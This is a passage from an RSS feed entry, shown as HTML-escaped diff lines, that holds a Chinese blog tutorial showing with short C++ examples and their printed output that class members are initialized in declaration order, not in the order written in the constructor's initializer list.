class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;输出：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;n1:35, n2:34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;对上面代码稍微做调整： 将 n1 和 n2 两个变量定义的顺序互换一下&lt;br&gt;
- &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A() :n2(34), n1(n2+1) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Print() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &amp;quot;n1:&amp;quot; &amp;lt;&amp;lt; n1 &amp;lt;&amp;lt; &amp;quot;, n2: &amp;quot; &amp;lt;&amp;lt; n2 &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.Print();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;打印结果：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;n1:-858993459, n2:34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;由此可以总结： 构造函数中，变量初始化的顺序，是以变量定义的顺序来定的，而不是简单的以构造函数中变量出现的顺序来定的&lt;/p&gt;
-&lt;p&gt;还可以使用有参的构造函数：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A(int k1,int k2) :n2(k1), n1(k2) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Print() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &amp;quot;n1:&amp;quot; &amp;lt;&amp;lt; n1 &amp;lt;&amp;lt; &amp;quot;, n2: &amp;quot; &amp;lt;&amp;lt; n2 &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A a(78,97);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.Print();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;输出：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;n1:97, n2:78&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;下面对上面进行改造一下：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A(int k1) :n2(k1), n1(n2) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Print() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &amp;quot;n1:&amp;quot; &amp;lt;&amp;lt; n1 &amp;lt;&amp;lt; &amp;quot;, n2: &amp;quot; &amp;lt;&amp;lt; n2 &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A a(115);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.Print();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;输出：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;n1:858993460, n2:115&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;通过最后一个例子，再次证明，变量初始化的顺序是严格按照各个变量定义的先后顺序来的，而不是简单的依据各变量在构造函数中出现的先后顺序来定的&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;下面两种写法是一个意思：&lt;/strong&gt;&lt;br&gt;
-写法一：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A(int k1,int k2) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n1 = k1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n2 = k2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;写法二：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A(int k1,int k2) :n1(k1),n2(k2)&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
